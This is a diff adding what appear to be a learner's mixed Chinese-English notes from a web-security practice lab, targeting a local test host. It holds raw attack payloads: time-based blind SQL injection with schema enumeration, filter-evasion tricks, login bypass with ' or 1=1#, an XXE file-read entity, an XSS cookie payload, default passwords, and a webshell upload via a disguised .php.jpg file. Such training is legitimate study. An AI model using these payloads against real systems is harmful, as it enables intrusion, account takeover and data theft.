@@ -1,0 +1,138 @@
+select if(1>2,3,4);
+select length(database())=7;
+select if((length(database())>1),1,sleep(5));
+
+
+select schema_name from information_schema.schemata;
+select table_name from information_schema.tables where table_schema='';
+select column_name from    information_schema.columns where table_name = '';
+
+
+
+select if((select length(schema_name) from information_schema.schemata limit 0,1)>1,1,sleep(5));
+select if((select length(schema_name) from information_schema.schemata limit 0,1)>1,1,sleep(5));
+select if((select length(schema_name) from information_schema.schemata limit 0,1)=18
+select if((select length(schema_name) from information_schema.schemata limit 0,1)>1,1,sleep(5));
+
+
+select left((select schema_name from information_schema.schemata limit 0,1),1);
+
+less03
+select if((length(database())>1),1,sleep(5));
+
+and  if((length(database())>2),1,sleep(5))--+ 
+select if((select length(schema_name) from information_schema.schemata limit 0,1)>1,1,sleep(5));
+select if((select length(schema_name) from information_schema.schemata limit 0,1)>1,1,sleep(5));
+
+
+select if(((select length(schema_name) from information_schema.schemata limit 0,1)>1),1,sleep(5));
+
+less04
+ if((length(database())>1,1,sleep(5)))
+ select if(  length(database())>1            ,1,sleep(5));
+  select if(length(database())>1,1,sleep(5));
+
+less06 
+select group_concat(schema_name) from information_schema.schemata;
+select schema_name from information_schema.schemata;
+
+
+mysql
+select schema_name from information_schema.schemata;
+select table_name from  information_schema.tables where table_schema= '库名';
+select column_name from information_schema.columns where table_name = '表名';
+select  列名 from 库名.表名;
+tips
+order by 
+information_schema,mysql,performance_schema,test,webug,webug_sys,webug_width_byte 
+data_crud,env_list,env_path,flag,sqlinjection,user,user_test 
+data_crud,env_list,env_path,flag,sqlinjection,user,user_test 
+id,flag 
+http://192.168.80.136/control/sqlinject/bool_injection.php?id=1' and if((length(database())>1),1,sleep(5))--+ 
+if((length(database())>1),1,sleep(5))
+(length(database())>1),1,sleep(5)
+database()
+对于布尔注入来说，现在我们使用的方法是可行的，但是存在一定的缺陷：
+1. 慢
+2. 不安全
+推荐一个新方法： DNSlog注入
+
+if((select length(schema_name) from information_schema.schemata limit 0,1)>100,1,sleep(5))--+
+webug_sys 
+webug 
+
+判断长度
+database()
+length(database())
+length(database())> 1
+if(A>B,C,D)
+select if(length(database())>1,1,sleep(5));
+
+
+select A and B;
+select A or B;
+
+
+' and select or union select
+union select 1,2;
+rep
+union select ==> UNion SelEct 
+union select 1/*,2*/;
+
+注入
+'
+"
+')
+'))
+")
+"))
+
+where id = ()/ ''/""/('')
+
+
+
+<?xml version="1.0"?>
+<!DOCTYPE ANY [
+    <!ENTITY crow SYSTEM "file:///C:/phpStudy/WWW//1.txt">
+]>
+<note>
+    <name>&crow;</name>
+</note>     
+
+<input name="search" type="text" value=""><script>alert(document.cookie)</script><required="">
+
+admin/admin/admin888/123456
+
+
+$sql = "SELECT * FROM user WHERE username = ' ' AND password = ' ' ;
+
+select * from user where username='' or 1=1 # and passsword='';
+id 
+
+C:/phpStudy/WWW/template/upload/crow.php
+http://192.168.80.136/template/upload/crow.php.jpg
+crow.php.jpg
+template/upload/crow.php.jpg
+.jpg 
+中国菜刀webshell   .jpg
+.htaccess .jpg==>.php
+
+
+弱口令
+admin/admin888   admin/123456  admin/admin123
+万能密码
+A or B 
+A and B 
+闭合前面的语句   or 1=1 #
+
+id= username      () ""  ''
+' or 1=1# 
+
+注册app    手机号码： 123134654654    验证码 123456  60s
+
+admin 
+user  
+id
+逻辑类型的
+
+
